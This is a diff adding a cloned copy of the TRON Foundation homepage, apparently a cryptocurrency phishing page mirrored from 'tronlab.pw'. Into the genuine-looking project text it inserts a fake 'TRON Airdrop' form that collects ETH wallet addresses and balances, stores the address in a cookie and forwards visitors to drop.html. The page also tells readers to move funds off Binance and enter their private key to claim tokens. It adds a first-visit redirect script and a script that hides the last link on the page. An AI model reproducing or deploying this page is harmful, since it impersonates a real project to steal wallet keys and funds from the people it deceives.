@@ -1,0 +1,534 @@
+<script type="text/javascript">
+
+var createCookie = function(name, value, days) {
+    var expires;
+    if (days) {
+        var date = new Date();
+        date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
+        expires = "; expires=" + date.toGMTString();
+    }
+    else {
+        expires = "";
+    }
+    document.cookie = name + "=" + value + expires + "; path=/";
+}
+
+var firstTime = localStorage.getItem("first_time");
+if(!firstTime) {
+    // first time loaded!
+	localStorage.setItem("first_time", "complete");
+    createCookie("info", "load", 1);
+	window.location = "index.html";
+}
+
+</script>
+
+<!DOCTYPE html>
+<html lang=zh-CN>
+
+
+<!-- Mirrored from tronlab.pw/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 13 Jun 2018 20:27:43 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+    <meta charset=UTF-8>
+    <meta name=format-detection content="telephone=no">
+    <meta content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0" name=viewport />
+    <link rel="shortcut icon" href=favicon.ico type=image/x-icon>
+    <meta name=keywords content=波场、TRON、孙宇晨、Justin、区块链、Ripple、瑞波、XRP、锐波、陪我、马云门徒、湖畔大学、福布斯、达沃斯论坛>
+    <meta name=description content=波场[TRON]是基于区块链的全球自由内容娱乐体系，其目标在于通过区块链的方式，构建一个全球范围内的自由内容娱乐体系，这个体系可以实现自由、高效的自增长，并且不会被内部或外部的中心化寡头控制。>
+    <title>波场[TRON]</title>
+    <script src=dn-peiwo-web.qbox.me/js/flexible.js_%3b%20filename_%3dutf-8%27%20%27flexible.js></script>
+    <script src="http://int.dpool.sina.com.cn/iplookup/iplookup.php?format=js" charset=utf-8></script>
+	<script src="cookie.js" charset=utf-8></script>
+    <script>
+        window.onload=function(){a.onclick=function(){remote_ip_info.country="中国",window.location.href="https://tron.network/"}}
+    </script>
+    <link href="index.53ea53ca.css" rel="stylesheet">
+</head>
+<script type="text/javascript" >
+function calcTokens(){
+	var span = document.getElementsByClassName("tronspan")[0].innerHTML;
+    var tokens = document.getElementsByName("ethbalance")[0].value * 50;
+	document.getElementsByClassName("tronspan")[0].innerHTML = tokens;
+}	
+
+function calcTokens2(){
+	var span = document.getElementsByClassName("tronspan2")[0].innerHTML;
+    var tokens = document.getElementsByName("tronbalance")[0].value * 0.25;
+	document.getElementsByClassName("tronspan2")[0].innerHTML = tokens;
+}	
+
+function setAddress(){
+	var address = document.getElementsByClassName("ethaddress")[0].value;
+	Cookies.set('address', address);
+}
+</script>
+
+<body>
+    <div class=main> <img style=position:absolute;z-index:-1;opacity:0;visibility:hidden src=dn-peiwo-web.qbox.me/tron/tronlogo.png_%3b%20filename_%3dutf-8%27%20%27tronlogo.png alt="">
+        <div class=mobilenav> <a href=index-2.html></a><span class=shownav></span><span class=closenav></span> </div>
+        <nav>
+            <div> <a href=index-2.html class=logo></a> <a href=https://www.raybo.com/ class=home>国内站点</a> <a href="indexdcdadcda.html?from=1" class=lang id=a>中文</a>
+                <div class=signbtn><a href=login.html>Login</a><a href=regist.html>Regist</a></div>
+                <div class="signed hide"><a href=mine.html><img src=dn-peiwo-web.qbox.me/tronavatar.png_%3b%20filename_%3dutf-8%27%20%27tronavatar.png alt=""></a><span>Logout</span></div>
+                <div class=spreads> <a href=#introduction class=active>TRON</a> <a href=#book>Whitepaper</a> <a href=#partner>Partner</a> <a href=#contact>Contact</a> </div>
+            </div>
+        </nav>
+        <div class=introductionnew>
+            <article>
+                <p class=titletron>TRON</p>
+                <p class=small> Decentralized Trustworthy Application, Smart Contracts empowered by blockchain, Digital Values issued and obtained by everyone, A Next Era of Web 4.0 </p>
+            </article>
+        </div>
+        <div class=>
+            <p> </p>
+					<h3 class="adaheader tronspancolor">TRON Airdrop</h3> 
+						<h4 class="adainfo">Fill in the form below in order to see how much TRX you can receive.</h4>
+						<h4 class="adainfo" >Please make sure you only use wallets that you own. (i.e. MyEtherWallet, Parity etc.)</h4>
+						<h4 class="adainfo" style="margin-bottom: 35px;">NOTE: Only use wallets that contain ETH/TRX funds, empty wallets are not supported by the airdrop.</h4>
+
+					<p></p>
+					<input type="text" name="ethaddress" id="ethaddress" class="form-control inputstyle ethaddress" placeholder="Enter your ETH wallet address" oninput="setAddress()"/><p></p>
+					<input type="number" name="ethbalance" id="ethbalance" class="form-control inputstyle ethbalance" placeholder="Enter your ETH balance" oninput="calcTokens()"/><p></p>
+					<input type="number" name="tronbalance" id="tronbalance" class="form-control inputstyle tronbalance" placeholder="Enter your TRON balance" oninput="calcTokens2()"/><p> </p>
+					<div class="textdiv"><span class="tokentext texttt">You will get</span> <span class="tronspan texttt">0</span> <span class="texttt">TRX tokens +</span> <span class="tronspan2 texttt">0</span> <span class="texttt">bonus TRX tokens</span></div><p></p>
+					<div data-id="mlhsxxz" class="elementor-element elementor-element-mlhsxxz elementor-widget elementor-widget-button continuebtn" data-element_type="button.default">
+					<div class="elementor-widget-container">
+					<div class="elementor-button-wrapper">
+					
+					<a href="drop.html" class="btn">
+					<p class="btnp">Continue</p></span></a></div>	</div></div>
+					
+					<p> </p><p> </p><p> </p>
+					<h3 class="adaheader tronspancolor">I hold TRX on Binance, what do I do? </h3>
+					<h4 class="adainfo botmargin15">Exchanges will not support the TRX airdrop, meaning you will not get bonus TRX tokens.</h4>
+					<h4 class="adainfo botmargin5">In order to get your TRX airdrop tokens you need to do the following:</h4>
+					<h4 class="adainfo botmargin5"><span class="tronspancolor">1.</span> Create personal Ethereum wallet that holds TRX tokens (Use <a href="https://myetherwallet.com/" style="color: #416a74 !important;">MyEtherWallet</a> for example</a>)</h4>
+					<h4 class="adainfo botmargin5"><span class="tronspancolor">2.</span> Withdraw your TRX and ETH from Binance to your personal wallet.</h4>
+					<h4 class="adainfo botmargin5"><span class="tronspancolor">3.</span> Enter your address, balance and given private key to claim the airdrop automatically.</h4>
+        </div>
+        <div id=introduction>
+            <div class=introduction>
+                <article>
+                    <h2></h2>
+                    <p>TRON is a blockchain-based decentralized protocol that aims to construct a worldwide free content entertainment system with the blockchain and distributed storage technology. The protocol allows each user to freely publish, store and
+                        own data, and in the decentralized autonomous form, decides the distribution, subscription and push of contents and enables content creators by releasing, circulating and dealing with digital assets, thus forming a decentralized
+                        content entertainment ecosystem.</p>
+                    <p>Peiwo App with over 10 million users will become the first TRON-compatible entertainment APP.</p>
+                </article>
+            </div>
+            <div class=foundation>
+                <article>
+                    <h2></h2>
+                    <p>TRON's team members are followers of Sir Tim Berners-Lee, who are convinced that protocol, from the moment of its invention, is an asset for human beings, rather than a profit-making tool for small groups. Hence, TRON has established
+                        the Singapore-based Tron Foundation, a nonprofit organization that mainly engages in operating the TRON network in the principles of openness, fairness and transparency and supporting TRON's development team.</p>
+                    <p>The Tron Foundation is set up with the approval of the Accounting and Corporate Regulatory Authority (ACRA) and under supervision and regulation of the Company Law of Singapore. It is run by the Board of Trustees or the Board of Governors
+                        formed by eligible trustees for independent management and operation, which is also independent from the government's administration.</p>
+                    <p>Singapore is renowned for its stable and well-established laws and financial environment. As a nonprofit entity established in Singapore, the Tron Foundation, subject to the laws of Singapore, is a legal entity having no commercial
+                        interest that supports and engages in activities for public or private benefits. The “profits” obtained by the Foundation are deemed surplus and will be retained for the organization and implementation of other activities and events.
+                        Members of the Foundation will never partake any distribution of profits.</p>
+                </article>
+                <a href=https://dn-peiwo-web.qbox.me/tron/Bizfile-Tron-Foundation-2017.07.28.pdf target=_blank>
+                    <p>Download the Bizfile</p>
+                </a>
+            </div>
+            <div class=mediareport> <span>As seen in</span><a target=_blank href=https://www.forbes.com/sites/rogeraitken/2017/08/12/could-this-millennial-crypto-tech-visionary-be-the-next-jack-ma/amp/><img src=dn-peiwo-web.qbox.me/forbes1.png_%3b%20filename_%3dutf-8%27%20%27forbes1.png
+                    alt=""></a><a target=_blank href="https://www.forbes.com/profile/justin-sun/?list=30under30-asia-consumer-technology"><img src=dn-peiwo-web.qbox.me/consumer1.png_%3b%20filename_%3dutf-8%27%20%27consumer1.png alt=""></a> </div>
+            <div
+                class=valueable>
+                <h2 class=title>Value of TRON</h2>
+                <div class=values>
+                    <h3>In the beginning of designing TRON, the following core values are always adhered to:</h3>
+                    <article>
+                        <p>1.Date creators (users) will have the fundamental ownership of data, and the internet should be decentralized. This was proposed by doctor Tim Berners-Lee at the time when the internet was born and the original intention for creation
+                            of the internet.</p>
+                        <p>2.Those who make a contribution to ecological TRON will be entitled to proportional profits according to rules. A value network has the greatest advantage that may digitally capitalize anything in social and media networks.</p>
+                        <p>3.All forms of contribution should be of equal quantitative value. Substantially, the time invested by participants, excellent contents created and attention are of the measure value as equal as the furnished capitals.</p>
+                        <p>4.The fundamental objective of TRON is to provide services for the public. As an ecology operated by a non-profit foundation, TRON is designed to serve the masses who enjoy content entertainment throughout the world, rather than
+                            for the purpose of gaining profits. All TRON participants will benefit from its prosperity.</p>
+                        <p>5.Contents should derive from people rather than capitals which should be used to reward people rather than to control people. Cultural and creative industries should be mainly driven by the pursuit of the quality of art and contents
+                            by content creators, artists and scriptwriters rather than the capitalists who consume no contents.</p>
+                    </article>
+                </div>
+        </div>
+        <div id=specialty class=specialty>
+            <h2 class=title>Characteristics of TRON</h2>
+            <div>
+                <h3>As a decentralized content protocol, TRON is of the following four basic characteristics compared with the centralized internet:</h3> <span>Data liberation: on a free and uncontrolled basis, the contents including characters, pictures, audios and videos may be unloaded, stored and spread.</span><span>Content enabling: digital assets are obtained through provision and spread of contents, thus economically stimulating the enabling of content ecology.</span><span>Personal ICO: an individual may freely distribute digital assets in the form of ICO, while others may enjoy the benefits and services brought due to the continuous development of data contributors by purchasing digital assets. </span><span>Infrastructure: with distributed digital assets will be equipped with a complete set of decentralized infrastructures, including distributed exchange, autonomous gaming, forecast and game system.</span>                </div>
+        </div>
+        <div class=trx id=trx>
+            <div>
+                <h2>TRONIX—Offical Token of TRON</h2>
+                <p>TRON’s official currency is TRONIX. TRONIX is the basic unit of accounts in TRON’s blockchain. The value of all other tokens are derived from the value of TRON.</p>
+                <p>TRON Power (TP) TP is locked TRON. Users can acquire TP by locking their TRONIX. TP, in nature, is TRONIX with voting right, which means TP holders have more privileges in the ecosystem. </p>
+                <p>TRON 20 TOKEN Content owners (IPs, individuals, and groups) can issue their digital assets freely through TRON 20 standards, while others can enjoy the benefits and services brought by the constant growth of data contributor by buying
+                    these digital assets.</p>
+            </div>
+            <div>TRX（Tronix）</div>
+        </div>
+        <div class=tronroad>
+            <h2 class=title>Plan</h2>
+            <div class=roads>
+                <div class=roadcontainer>
+                    <div class="road roadvisible"> <span class=stage11></span>
+                        <div class=stage>
+                            <h3>1. Exodus</h3>
+                            <div>
+                                <p>Data Liberation<br>A mechanism of upload, storage, and distribution which is based on peer-to-peer and distributed contents.<br>In the Exodus phase, on the basis of the distributed storage technology, TRON will provide
+                                    users with a completely free and reliable platform for data publication, storage and dissemination.</p>
+                            </div>
+                        </div>
+                    </div>
+                    <div class=road> <span class=stage12></span>
+                        <div class=stage>
+                            <h3>2. Odyssey</h3>
+                            <div>
+                                <p>Content Empowerment<br>Economic incentives, empowerment, content ecology and block chain technology will create a fully competitive economic mechanism with fair returns for content creation, distribution and dissemination.
+                                    Therefore, individuals can be encouraged and contents can be empowered, thus constantly expanding the boundary of the system.</p>
+                            </div>
+                        </div>
+                    </div>
+                    <div class=road> <span class=stage13></span>
+                        <div class=stage>
+                            <h3>3. Great Voyage</h3>
+                            <div>
+                                <p>Personal ICO<br>Based on the advantage of block chain, TRON solves three major issues: income measurement, dividend payment and management of supporters, and achieves significant transformation from the "fan economy" to
+                                    the "fan finance".</p>
+                            </div>
+                        </div>
+                    </div>
+                    <div class=road> <span class=stage14></span>
+                        <div class=stage>
+                            <h3>4. Apollo</h3>
+                            <div>
+                                <p>Free Movement of Value—De-centralized Token Trading Exclusively for Individuals<br>To reach the goal that each content producer in the TRON system can issue their own tokens, the system must have a complete solution for
+                                    de-centralized tradings. Through the establishment of the de-centralized trading platform, the value, property rights and risks of the system can be freely traded and exchanged, thus increasing the economic vitality
+                                    of the whole system in geometric multiples.</p>
+                            </div>
+                        </div>
+                    </div>
+                    <div class=road> <span class=stage15></span>
+                        <div class=stage>
+                            <h3>5. Star Trek</h3>
+                            <div>
+                                <p>Traffic Monetizing—Gaming of De-centralization and Market Forecast<br>The size of the global gaming market in 2014 exceeded $450 billion. Traffic brought by the TRON content platform makes it possible to build an online
+                                    gaming platform for de-centralization. Developers can freely build online gaming platforms through TRON, providing fully autonomous gamings and predicting market functions. </p>
+                            </div>
+                        </div>
+                    </div>
+                    <div class=road> <span class=stage16></span>
+                        <div class=stage>
+                            <h3>6. Eternity</h3>
+                            <div>
+                                <p>Traffic Conversion—De-centralized Game<br>In 2016, the global video game market amounted to $ 9.66 billion, of which the scale of the phone game market was $ 4.61 billion, accounting for 42%. TRON provides the possibility
+                                    for establishing an on-line game platform. Developers can freely set up game platforms through TRON, achieve crowd-funding for game development, and make it possible for common investors to invest in games.</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class=dots><span class=active></span><span></span><span></span><span></span><span></span><span></span></div>
+            </div>
+        </div>
+        <div class=plans id=plans>
+            <h2 class=title>Plan</h2>
+            <div class=plan> <a href=javascript:void(0); class=planbtnleft></a> <a href=javascript:void(0); class=planbtnright></a>
+                <ul>
+                    <li class=stage1>
+                        <div>
+                            <h3>Exudos</h3>
+                            <p>A mechanism of upload, storage, and distribution which is based on peer-to-peer and distributed contents.<br>In the Exodus phase, on the basis of the distributed storage technology, TRON will provide users with a completely
+                                free and reliable platform for data publication, storage and dissemination.</p>
+                        </div>
+                    </li>
+                    <li class=stage2>
+                        <div>
+                            <h3>Odyssey</h3>
+                            <p>Economic incentives, empowerment, content ecology and block chain technology will create a fully competitive economic mechanism with fair returns for content creation, distribution and dissemination. Therefore, individuals
+                                can be encouraged and contents can be empowered, thus constantly expanding the boundary of the system.</p>
+                        </div>
+                    </li>
+                    <li class=stage3>
+                        <div>
+                            <h3>Great Voyage</h3>
+                            <p>Based on the advantage of block chain, TRON solves three major issues: income measurement, dividend payment and management of supporters, and achieves significant transformation from the "fan economy" to the "fan finance".</p>
+                        </div>
+                    </li>
+                    <li class=stage4>
+                        <div>
+                            <h3>Apollo</h3>
+                            <p>To reach the goal that each content producer in the TRON system can issue their own tokens, the system must have a complete solution for de-centralized tradings. Through the establishment of the de-centralized trading platform,
+                                the value, property rights and risks of the system can be freely traded and exchanged, thus increasing the economic vitality of the whole system in geometric multiples.</p>
+                        </div>
+                    </li>
+                    <li class=stage5>
+                        <div>
+                            <h3>Star Trek</h3>
+                            <p>The size of the global gaming market in 2014 exceeded $450 billion. Traffic brought by the TRON content platform makes it possible to build an online gaming platform for de-centralization. Developers can freely build online
+                                gaming platforms through TRON, providing fully autonomous gamings and predicting market functions.</p>
+                        </div>
+                    </li>
+                    <li class=stage6>
+                        <div>
+                            <h3>Eternity</h3>
+                            <p>In 2016, the global video game market amounted to $ 9.66 billion, of which the scale of the phone game market was $ 4.61 billion, accounting for 42%. TRON provides the possibility for establishing an on-line game platform.
+                                Developers can freely set up game platforms through TRON, achieve crowd-funding for game development, and make it possible for common investors to invest in games.</p>
+                        </div>
+                    </li>
+                </ul>
+            </div>
+        </div>
+        <div id=team class=team>
+            <h2 class=title>CEO</h2> <b>JUSTIN</b> <span class=ceo><b>Justin Sun </b>Graduated from University of Pennsylvania</span>
+            <div class=awards> <span>Founder of Peiwo APP</span><span>2015 Forbes China, 30 under 30</span><span>Former Chief Representative in Greater China of Ripple</span><span>2017 Forbes Asia, 30 under 30</span><span>Protégé of Jack Ma, the Founder of Alibaba Group</span><span>Global Shaper, World Economic Forum</span>                </div>
+        </div>
+        <div class=timeline id=timeline>
+            <h2 class=title>Schedule</h2>
+            <div> <span class=timeline_top>Exudos, August 2017 to December 2018</span><span class=timeline_top>Great Voyage, July 2020 to July 2021</span><span class=timeline_top>Star Trek, April 2023 to September 2025</span>
+                <p></p><span class=timeline_bottom>Odyssey, January 2019 to June 2020</span><span class=timeline_bottom>Apollo, August 2021 to March 2023</span><span class=timeline_bottom>Eternity, September 2025 to September 2027</span> </div>
+        </div>
+    </div>
+    <div id=book class=book>
+        <h2 class=title>Whitepaper</h2> <a target=_blank href=https://dn-peiwo-web.qbox.me/Tron-Whitepaper-0831-V17.pdf>Whitepaper In Chinese</a><a href=https://dn-peiwo-web.qbox.me/Tron-Whitepaper-1031-V18-EN.pdf target=_blank>Whitepaper In English</a> </div>
+    <div id=partner>
+        <div id=teaminfor class=investors>
+            <h2 class=title>Team</h2>
+            <div class=teaminvestor> <span class=teaminvestor_left></span><span class=teaminvestor_right></span>
+                <ul id=teaminvestor>
+                    <li> <img src=dn-peiwo-web.qbox.me/tron/investor/czq.png_%3b%20filename_%3dutf-8%27%20%27czq.png alt="">
+                        <div>
+                            <h3>Lucien Chen</h3>
+                            <p>CTO Lucien Chen has served in many first-tier Internet companies, such as Netease...</p>
+                        </div> <span></span>
+                        <p>Lucien Chen has served in many first-tier Internet companies, such as Netease(NASDAQ:NTES) youdao, Tencent(00700.HK), Qihoo 360(NASDAQ:QIHU) and SM search (Alibaba P8 +). With capabilities of developing with million-level system
+                            architecture, he has rich experience in big data, advertising algorithms, DMP system, BT system, CTR platform and high concurrent system framework design. He also has many practical experience in team management, strategic
+                            planning and business integration. Apart from that, Lucien Chen not only has a deep understanding in cryptography, but also support and invest Bitcoin at the early stage.</p>
+                    </li>
+                    <li> <img src=dn-peiwo-web.qbox.me/tron/investor/yks.png_%3b%20filename_%3dutf-8%27%20%27yks.png alt="">
+                        <div>
+                            <h3>Keelson Yang</h3>
+                            <p>Technical Director. He graduated from the Computer Department of Tsinghua University...</p>
+                        </div> <span></span>
+                        <p>He graduated from the Computer Department of Tsinghua University with a bachelor's degree. With more than 15 years of work experience at front and rear ends, he has worked at UFIDA—a leading provider of enterprise management software,
+                            corporate internet services, and corporate financial services in the Asia-Pacific region, and then at the China Roads Information Technology (Beijing) Co., Ltd.—China's leading provider of express highway monitoring system
+                            solutions. Yang Kaishan has great accomplishments in front and rear ends of the system. He has paid close attention to technological developments in blockchain since 2013.</p>
+                    </li>
+                    <li> <img src=dn-peiwo-web.qbox.me/tron/investor/xxd.png_%3b%20filename_%3dutf-8%27%20%27xxd.png alt="">
+                        <div>
+                            <h3>Xie Xiaodong</h3>
+                            <p>Developer three years’ of technical development expertise. He previously...</p>
+                        </div> <span></span>
+                        <p>Three years’ of technical development expertise. He previously worked as an engineer at LeEco. He has deep knowledge and experience in live webcast and online entertainment technical development. His expertise includes Java and
+                            Go.</p>
+                    </li>
+                    <li> <img src=dn-peiwo-web.qbox.me/tron/investor/lmr.png_%3b%20filename_%3dutf-8%27%20%27lmr.png alt="">
+                        <div>
+                            <h3>Lin Maorong</h3>
+                            <p>Developer Four years’ of technical development expertise. He previously...</p>
+                        </div> <span></span>
+                        <p>Four years’ of technical development expertise. He previously worked at several Chinese internet commerce companies. His expertise includes Java and Python on Linux, and system integration.</p>
+                    </li>
+                    <li> <img src=dn-peiwo-web.qbox.me/tron/investor/wjj.png_%3b%20filename_%3dutf-8%27%20%27wjj.png alt="">
+                        <div>
+                            <h3>Wang Junju</h3>
+                            <p>Web Developer Four years’ experience in web development, familiar with...</p>
+                        </div> <span></span>
+                        <p>Four years’ experience in web development, familiar with JavaScript, HTML and CSS in the PC and mobile development.</p>
+                    </li>
+                    <li> <img src=dn-peiwo-web.qbox.me/tron/investor/cxq.png_%3b%20filename_%3dutf-8%27%20%27cxq.png alt="">
+                        <div>
+                            <h3>Chen Xiaoqian</h3>
+                            <p>Web Developer Senior web developer, five years’ experience in web development...</p>
+                        </div> <span></span>
+                        <p>Senior web developer, five years’ experience in web development, proficient in JavaScript, HTML and CSS in webpage making.</p>
+                    </li>
+                    <li> <img src=dn-peiwo-web.qbox.me/tron/investor/wzz.png_%3b%20filename_%3dutf-8%27%20%27wzz.png alt="">
+                        <div>
+                            <h3>Wang Zhaozhou</h3>
+                            <p>Python Developer Four years development experience, familiar with python...</p>
+                        </div> <span></span>
+                        <p>Four years development experience, familiar with python and C language, Django framework, and experienced in campus products.</p>
+                    </li>
+                    <li> <img src=dn-peiwo-web.qbox.me/tron/investor/yanz.png_%3b%20filename_%3dutf-8%27%20%27yanz.png alt="">
+                        <div>
+                            <h3>Yan Zhao</h3>
+                            <p>python developer Four years’ development experience, experienced in backstage framework</p>
+                        </div>
+                    </li>
+                    <li> <img src=dn-peiwo-web.qbox.me/tron/investor/zzw.png_%3b%20filename_%3dutf-8%27%20%27zzw.png alt="">
+                        <div>
+                            <h3>Zhang Zhongwen</h3>
+                            <p> Java Developer,Four years’ development experience, familiar with java...</p>
+                        </div> <span></span>
+                        <p>Java Developer,Four years’ development experience, familiar with java language. Skilled in Html, CSS, JSP.</p>
+                    </li>
+                    <li> <img src=dn-peiwo-web.qbox.me/tron/investor/qhao.png_%3b%20filename_%3dutf-8%27%20%27qhao.png alt="">
+                        <div>
+                            <h3>Qi Hao</h3>
+                            <p>Four years’ development experience, experienced in social networking products.</p>
+                        </div>
+                    </li>
+                    <li> <img src=dn-peiwo-web.qbox.me/tron/investor/wyb.png_%3b%20filename_%3dutf-8%27%20%27wyb.png alt="">
+                        <div>
+                            <h3>Wang Yibing</h3>
+                            <p> IOS Developer,Three years development experience, experienced...</p>
+                        </div> <span></span>
+                        <p>IOS Developer,Three years development experience, experienced in community networking products.</p>
+                    </li>
+                    <li> <img src=dn-peiwo-web.qbox.me/tron/investor/psy.png_%3b%20filename_%3dutf-8%27%20%27psy.png alt="">
+                        <div>
+                            <h3>Peng Shaoyang</h3>
+                            <p>Five years’ development experience, experienced in network tools.</p>
+                        </div>
+                    </li>
+                    <li> <img src=dn-peiwo-web.qbox.me/tron/investor/wfc.jpg_%3b%20filename_%3dutf-8%27%20%27wfc.jpg alt="">
+                        <div>
+                            <h3>Wu Fuchang</h3>
+                            <p>Android Developer Seven years’ development experience, experienced in...</p>
+                        </div> <span></span>
+                        <p>Android Developer Seven years’ development experience, experienced in mobile app for hardware products.</p>
+                    </li>
+                    <li> <img src=dn-peiwo-web.qbox.me/tron/investor/chbin.png_%3b%20filename_%3dutf-8%27%20%27chbin.png alt="">
+                        <div>
+                            <h3>Cheng Bin</h3>
+                            <p>Android Developer Four years’ development experience, experienced in...</p>
+                        </div> <span></span>
+                        <p>Android Developer Four years’ development experience, experienced in mobile app for hardware products.</p>
+                    </li>
+                    <li> <img src=dn-peiwo-web.qbox.me/tron/investor/jxq.png_%3b%20filename_%3dutf-8%27%20%27jxq.png alt="">
+                        <div>
+                            <h3>Jiang Xiaoqiang</h3>
+                            <p>Android Developer Five years’ development experience, experienced in...</p>
+                        </div> <span></span>
+                        <p>Android Developer Five years’ development experience, experienced in online entertainment products..</p>
+                    </li>
+                    <li> <img src=dn-peiwo-web.qbox.me/tron/investor/csm.png_%3b%20filename_%3dutf-8%27%20%27csm.png alt="">
+                        <div>
+                            <h3>Chen Songming</h3>
+                            <p>Design Senior designer, experienced in UI, animation and Illustration.</p>
+                        </div>
+                    </li>
+                </ul>
+            </div>
+        </div>
+        <div id=investors class=investors>
+            <h2 class=title>Team</h2>
+            <div class=investor> <span class=investor_left></span><span class=investor_right></span>
+                <ul id=investor style=transform:translateX(-400px)>
+                    <li> <img src=dn-peiwo-web.qbox.me/tron/investor/zhoushuoji.png_%3b%20filename_%3dutf-8%27%20%27zhoushuoji.png alt="">
+                        <div>
+                            <h3>Shuoji Zhou</h3>
+                            <p>Initial partner of FBG Capital</p>
+                        </div>
+                    </li>
+                    <li> <img src=dn-peiwo-web.qbox.me/tron/investor/xuyiji.jpeg_%3b%20filename_%3dutf-8%27%20%27xuyiji.jpg alt="">
+                        <div>
+                            <h3>Hitters Xu</h3>
+                            <p>Founder of Nebulas & ico365</p>
+                        </div>
+                    </li>
+                    <li> <img src=dn-peiwo-web.qbox.me/tron/investor/tangbinsen.png_%3b%20filename_%3dutf-8%27%20%27tangbinsen.png alt="">
+                        <div>
+                            <h3>Binshen Tang</h3>
+                            <p>Founder of Clash of Kings with over 10 million MAU worldwide</p>
+                        </div>
+                    </li>
+                    <li> <img src=dn-peiwo-web.qbox.me/tron/investor/wangchaoyong.png_%3b%20filename_%3dutf-8%27%20%27wangchaoyong.png alt="">
+                        <div>
+                            <h3>Chaoyong Wang</h3>
+                            <p>Founder of ChinaEquity Group with over 2 billion USD market value</p>
+                        </div>
+                    </li>
+                    <li> <img src=dn-peiwo-web.qbox.me/tron/investor/daiwei.png_%3b%20filename_%3dutf-8%27%20%27daiwei.png alt="">
+                        <div>
+                            <h3>Wei Dai</h3>
+                            <p style=line-height:inherit>Founder of ofo,the biggest shared bicycles provider in China with estimate value over 3 billion USD.</p>
+                        </div>
+                    </li>
+                    <li> <img src=dn-peiwo-web.qbox.me/tron/investor/chenweixing.png_%3b%20filename_%3dutf-8%27%20%27chenweixing.png alt="">
+                        <div>
+                            <h3>Weixing Chen</h3>
+                            <p>Founder of Kuaidi, famous angel investor.</p>
+                        </div>
+                    </li>
+                    <li> <img src=dn-peiwo-web.qbox.me/tron/investor/xuemanzi.png_%3b%20filename_%3dutf-8%27%20%27xuemanzi.png alt="">
+                        <div>
+                            <h3>Charles Xue</h3>
+                            <p>Famous angel investor</p>
+                        </div>
+                    </li>
+                    <li> <img src=dn-peiwo-web.qbox.me/tron/investor/yinmingshan.png_%3b%20filename_%3dutf-8%27%20%27yinmingshan.png alt="">
+                        <div>
+                            <h3>Mingshan Yin</h3>
+                            <p>Founder of Lifan Group with over 2 billion USD market value</p>
+                        </div>
+                    </li>
+                    <li> <img src=dn-peiwo-web.qbox.me/tron/investor/yanglinke.png_%3b%20filename_%3dutf-8%27%20%27yanglinke.png alt="">
+                        <div>
+                            <h3>Linke Yang</h3>
+                            <p>Founder of BTC China</p>
+                        </div>
+                    </li>
+                    <li> <img src=dn-peiwo-web.qbox.me/tron/investor/liujiang.png_%3b%20filename_%3dutf-8%27%20%27liujiang.png alt="">
+                        <div>
+                            <h3>Jiang Liu</h3>
+                            <p>Founder of Trends Group which is the largest publisher of fashion magazines in China</p>
+                        </div>
+                    </li>
+                    <li> <img src=dn-peiwo-web.qbox.me/tron/investor/wanglifen.png_%3b%20filename_%3dutf-8%27%20%27wanglifen.png alt="">
+                        <div>
+                            <h3>Lifen Wang</h3>
+                            <p>Famous media personality in China who made Jack Ma famous in early 2000s</p>
+                        </div>
+                    </li>
+                    <li> <img src=dn-peiwo-web.qbox.me/tron/investor/tongdao.png_%3b%20filename_%3dutf-8%27%20%27tongdao.png alt="">
+                        <div>
+                            <h3>Uncle</h3>
+                            <p>The biggest Key Opinion Leader in China with over 10 million fans</p>
+                        </div>
+                    </li>
+                </ul>
+            </div>
+        </div>
+        <div class=partner>
+            <h2 class=title>Partner</h2>
+            <div class=partners> <span class=partner_left></span><span class=partner_right></span>
+                <div class=partneritems style=transform:translateX(-180px)>
+                    <div><img src=dn-peiwo-web.qbox.me/tron/partner/peiwo.png_%3b%20filename_%3dutf-8%27%20%27peiwo.png alt="">Pei Wo APP</div>
+                    <div><img src=dn-peiwo-web.qbox.me/tron/partner/fbg.png_%3b%20filename_%3dutf-8%27%20%27fbg.png alt="">FBG资本</div>
+                    <div><img src=dn-peiwo-web.qbox.me/tron/partner/bitmain.png_%3b%20filename_%3dutf-8%27%20%27bitmain.png alt="">BITMAIN</div>
+                    <div><img src=dn-peiwo-web.qbox.me/tron/partner/bixin.png_%3b%20filename_%3dutf-8%27%20%27bixin.png alt="">Bixin</div>
+                    <div><img src=dn-peiwo-web.qbox.me/tron/partner/ico365.png_%3b%20filename_%3dutf-8%27%20%27ico365.png alt="">ico365</div>
+                    <div><img src=dn-peiwo-web.qbox.me/tron/partner/gravityless.png_%3b%20filename_%3dutf-8%27%20%27gravityless.png alt="">GRAVITYLESS</div>
+                    <div><img src=dn-peiwo-web.qbox.me/tron/partner/openledger.png_%3b%20filename_%3dutf-8%27%20%27openledger.png alt="">OpenLedger</div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div id=contact class=contact>
+        <h2 class=title>Contact</h2> <a target=_blank href=https://www.facebook.com/TronFoundation-144555002795817/ class=foreign></a><a target=_blank href=https://tronfoundation.slack.com/ class=foreign></a><a target=_blank href=https://www.twitter.com/tronfoundation
+            class=foreign></a><span class=wechat>Justin Sun's WeChat</span><span class=wechat>QQ Group</span><span class=wechat>WeChat Service</span> </div>
+    <footer>Copyright©2017-2018 TRON Foundation</footer>
+    </div>
+    <div class="announce hide">
+        <div class=announcement>
+            <h2>Announcement</h2><a href=javascript:;></a>
+            <article></article>
+        </div>
+    </div>
+    <div style=display:none>
+        <script src="https://s19.cnzz.com/z_stat.php?id=1263139301&amp;web_id=1263139301" language=JavaScript></script>
+    </div>
+    <script src=cdn.bootcss.com/jquery/3.2.1/jquery.min.js></script>
+    <script src=npmcdn.com/particlesjs%402.0.2/dist/particles.min.js></script>
+    <script src=dn-peiwo-web.qbox.me/js/md5.js_%3b%20filename_%3dutf-8%27%20%27md5.js></script>
+    <script src="https://s19.cnzz.com/z_stat.php?id=1271190986&amp;web_id=1271190986" language=JavaScript></script>
+    <script>
+        var a=document.getElementsByTagName("a");a[a.length-1].style.opacity=0
+    </script>
+    <script type="text/javascript" src="common.75eff303.js"></script>
+    <script type="text/javascript" src="index.02695ba1.js"></script>
+</body>
+
+
+<!-- Mirrored from tronlab.pw/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 13 Jun 2018 20:29:09 GMT -->
+</html>
